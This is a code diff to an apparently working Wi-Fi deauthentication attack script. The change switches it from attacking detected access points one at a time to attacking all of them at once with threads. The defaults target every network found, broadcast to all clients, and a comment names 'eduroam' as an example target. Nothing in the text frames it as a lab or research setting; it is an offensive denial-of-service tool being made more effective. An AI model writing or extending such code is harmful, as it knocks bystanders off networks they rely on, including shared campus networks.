@@ -28,8 +28,9 @@ import os
 import time
 import re
 import pwd
+import threading
 #import pprint
-import _thread
+#import _thread
 
 # Import LCD display module for status updates
 try:
@@ -246,18 +247,38 @@ def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_ess
 		return
 
 	if attack_all:
-		# Attack all detected APs in sequence
-		print(f"Attacking {len(my_list)} access point(s)...")
+		# Attack all detected APs simultaneously using threads
+		print(f"Attacking {len(my_list)} access point(s) SIMULTANEOUSLY...")
 		
 		# Sort by signal strength (strongest first)
 		my_list.sort(key=lambda x: x[3])
 		
-		# Attack each AP in the list
+		# Create threads for each AP attack
+		threads = []
 		for idx, lst in enumerate(my_list, 1):
-			print(f"[{idx}/{len(my_list)}] Attacking {lst[2]} ({lst[0]})")
-			if LCD_AVAILABLE:
-				display_status(f"AP {idx}/{len(my_list)}", lst[2][:16])
-			deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])
+			print(f"[{idx}/{len(my_list)}] Starting attack on {lst[2]} ({lst[0]})")
+			
+			# Create thread for this AP
+			thread = threading.Thread(
+				target=deauth,
+				args=(interface, num_pkts_to_send, lst[0], lst[1], lst[2]),
+				daemon=True
+			)
+			threads.append(thread)
+			thread.start()
+		
+		# Update LCD to show simultaneous attack
+		if LCD_AVAILABLE:
+			display_status(f"Attacking {len(my_list)}", "Simultaneously")
+		
+		print(f"\nAll {len(threads)} attacks launched simultaneously!")
+		print("Waiting for attacks to complete...")
+		
+		# Wait for all threads to finish
+		for thread in threads:
+			thread.join()
+		
+		print("All attacks completed!")
 	else:
 		# Attack only the strongest AP
 		# Sort by power (index 3) - strongest signal has highest value (least negative)
@@ -434,9 +455,9 @@ target_essid = None               # None = attack all networks found
                                    # Or set to "eduroam" for specific network
 
 # Attack Mode
-# Set to True to attack all found networks/APs in sequence
+# Set to True to attack all found networks/APs simultaneously (using threads)
 # Set to False to attack only the strongest signal
-attack_all_found = True           # True = attack all, False = strongest only
+attack_all_found = True           # True = attack all simultaneously, False = strongest only
 
 # ============================================================================
 # Initialization
@@ -520,10 +541,12 @@ if target_essid:
 else:
     print("Target Network: All networks")
 if attack_all_found:
-    print("Attack Mode: ALL access points found")
+    print("Attack Mode: ALL access points SIMULTANEOUSLY")
+    print("             (Multi-threaded attack)")
 else:
     print("Attack Mode: Strongest signal only")
 print(f"Packets per AP: {deauth_num_pkts}")
+print(f"Broadcast Mode: Enabled (targeting all clients)")
 print("="*50 + "\n")
 
 # Test airodump-ng before starting main loop
